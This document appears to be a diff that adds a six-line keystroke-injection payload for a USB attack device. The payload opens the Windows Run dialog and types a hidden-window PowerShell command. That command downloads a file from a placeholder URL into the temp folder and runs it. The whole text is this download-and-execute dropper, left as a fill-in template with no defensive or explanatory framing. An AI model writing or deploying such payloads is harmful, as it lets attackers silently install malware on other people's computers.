@@ -1,0 +1,6 @@
+DELAY 750
+GUI r
+DELAY 1000
+STRING powershell -windowstyle hidden -command "& { (New-Object Net.WebClient).DownloadFile('[URL]', '%temp%/[NAME]') ;Start-Process '%temp%/[NAME]'}" 
+DELAY 500
+ENTER
